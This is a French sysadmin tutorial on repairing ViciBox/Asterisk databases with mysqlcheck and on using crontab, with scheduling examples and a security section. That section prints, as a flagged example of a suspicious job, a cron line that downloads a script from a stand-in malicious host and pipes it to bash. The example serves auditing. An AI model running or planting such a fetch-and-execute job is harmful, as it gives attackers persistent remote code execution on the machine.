Repertoire de la base des données de vicibox : /srv/mysql/data/asterisk

Il faut stoper  les service asterisk : 
```
service asterisk stop
```

Pour réparer les bases de données Asterisk/Vicidial dans ViciBox, utilisez [mysqlcheck](https://www.google.com/search?q=mysqlcheck&sca_esv=ec04cb20b49346cc&sxsrf=ANbL-n6amb8mq4KiKuVc_fPQ9fV00I1fyg%3A1770613519708&ei=D2uJaZj5Kr3RhbIP5ZbQyA0&biw=1366&bih=594&ved=2ahUKEwj937W20cuSAxVwWUEAHTFtGc4QgK4QegQIARAB&uact=5&oq=comment+r%C3%A9parer+les+bases+des+donn%C3%A9es+d%27asterisik+dans+vicibox&gs_lp=Egxnd3Mtd2l6LXNlcnAiQGNvbW1lbnQgcsOpcGFyZXIgbGVzIGJhc2VzIGRlcyBkb25uw6llcyBkJ2FzdGVyaXNpayBkYW5zIHZpY2lib3hIqBtQqgtYlA1wAXgAkAEAmAHjAqABwQWqAQMzLTK4AQPIAQD4AQGYAgGgAgbCAggQABiwAxjvBcICCxAAGIAEGLADGKIEmAMAiAYBkAYFkgcBMaAH4wWyBwC4BwDCBwMyLTHIBwSACAA&sclient=gws-wiz-serp&mstk=AUtExfCBa3hO4fMPWfRSPXDlP2j2OJUb78zbyxX0uZbpOgvJbvAaPm74SHGsOJ6Xb6wJK2-P4XZRa2q78CecVv-w64xlFHw6PKtcHBmCW-o0Z5FJT3NUtacko4U575veEB7-qqulL8slDFzMeGA9kOBy9wtkEopJkx0LcmyZqt8tcphuM2K5KYEHP02jAm3nIYqBrqt_lcnpethZpdzvzsMOsbwYWiKJCBVN3arLgHztRsKqyKwOWmV_QMh3yoO_au3HYzLpflF9xsbN0jQP2DVoPyeU&csui=3) avec les options `--auto-repair` et `--optimize`. Identifiez les erreurs via les logs dans `/var/log/astguiclient`, puis exécutez la commande avec les identifiants root (ou `cron`/`1234` par défaut) pour réparer les tables corrompues. 

**Étapes de réparation (via SSH) :**

1. **Réparation automatique** : Exécutez la commande suivante pour tenter de réparer toutes les bases de données :  
    `mysqlcheck -ucron -p1234 --auto-repair --all-databases`.
2. **Optimisation** : Après réparation, optimisez les tables pour améliorer les performances :  
    `mysqlcheck -ucron -p1234 --optimize --all-databases`.
3. **Réparation spécifique** : Si seule la base `asterisk` est touchée :  
    `mysqlcheck -p --auto-repair asterisk`.


## **crontab** 

Dans Vicidial, le **crontab** est essentiel pour automatiser la sauvegarde de la base de données MySQL`mysqldump` ou des scripts Vicidial comme `AST_DB_backup.pl`) à des intervalles réguliers (ex: chaque nuit). Il assure la sécurité des données sans intervention manuelle, en permettant des sauvegardes automatiques et récurrentes.

**Utilité principale du Crontab pour le backup Vicidial :**

- **Planification automatique :** Il lance les scripts de sauvegarde de la base de données Vicidial à une date et une heure précises.
- **Sécurité et rétention :** Il permet de planifier des sauvegardes nocturnes (ou fréquentes) pour éviter la perte de données en cas de crash.
- **Automatisation du nettoyage :** Il peut être configuré pour supprimer automatiquement les anciennes sauvegardes, évitant ainsi la saturation de l'espace disque.
- **Récurrence :** Il garantit l'exécution continue et fiable de la sauvegarde (chaque jour, semaine, mois).



---

# 🧠 1. C’est quoi `crontab` ?

`crontab` permet de **planifier des tâches automatiques** sur Linux.

👉 Exemple :

- Lancer un script tous les jours
- Sauvegarder un serveur
- Redémarrer un service

📌 Le service derrière = **cron**

---

# ⏰ 2. Structure d’une tâche cron

Une ligne de crontab =
```

* * * * * commande  
│ │ │ │ │  
│ │ │ │ └── Jour de la semaine (0-7) (dimanche = 0 ou 7)  
│ │ │ └──── Mois (1-12)  
│ │ └────── Jour du mois (1-31)  
│ └──────── Heure (0-23)  
└────────── Minute (0-59)

```
---

# 📌 3. Exemples simples

### 🕐 Exécuter toutes les minutes

```
* * * * * /script.sh
```

---

### 🕛 Tous les jours à minuit

```
0 0 * * * /backup.sh
```

---

### 📅 Tous les lundis à 8h

```
0 8 * * 1 /script.sh

```
---

### ⏱️ Toutes les 5 minutes

```
*/5 * * * * /script.sh
```

---

# ⚙️ 4. Commandes importantes

### ✏️ Éditer le crontab

```
crontab -e
```

---

### 📄 Voir les tâches

```
crontab -l
```

---

### 🗑️ Supprimer toutes les tâches

```
crontab -r
```

---

# 🔐 5. Crontab et sécurité (TRÈS IMPORTANT)

## ⚠️ a) Risques

Un crontab mal utilisé peut :

- Exécuter du code malveillant automatiquement
- Maintenir un accès (backdoor)
- Lancer un script caché toutes les minutes

👉 Très utilisé en **post-exploitation (hacking)**

---

## 🔍 b) Vérification (audit sécurité)

Toujours vérifier :

```
crontab -l
```

Et aussi :

```
cat /etc/crontab  
ls /etc/cron.*
```

---

## 🚨 c) Exemple de tâche suspecte

```
* * * * * curl http://malicious-site.com/shell.sh | bash

```
👉 ⚠️ dangereux : télécharge et exécute un script

---

# 🛡️ 6. Bonnes pratiques

### ✅ Toujours :

- Utiliser chemins absolus (`/usr/bin/python3`)
- Rediriger les logs

```
0 2 * * * /backup.sh >> /var/log/backup.log 2>&1
```

---

### 🔒 Limiter les accès :

- `/etc/cron.allow`
- `/etc/cron.deny`

---

### 👀 Surveiller :

- fichiers modifiés
- tâches inconnues

---

# ⚡ 7. Cas pratique (serveur Asterisk)

👉 Tu peux utiliser `crontab` pour :

### 📞 Redémarrer Asterisk chaque nuit

```
0 3 * * * systemctl restart asterisk
```

---

### 📊 Sauvegarde config Asterisk

```
0 1 * * * tar -czf /backup/asterisk.tar.gz /etc/asterisk
```

---

### 🛡️ Nettoyer les logs

```
0 0 * * * find /var/log/asterisk -type f -mtime +7 -delete
```

---

# 🧠 8. Astuces utiles

### 🔢 Utiliser des listes

```
0 6,18 * * * /script.sh
```

👉 6h et 18h

---

### ➖ Utiliser des plages

```
0 9-17 * * 1-5 /script.sh
```

👉 heures de bureau

---

# 🎯 9. Résumé simple

- `crontab` = automatisation des tâches
- Format = `minute heure jour mois jour_semaine`
- Très puissant… mais dangereux si mal utilisé
- Toujours surveiller en sécurité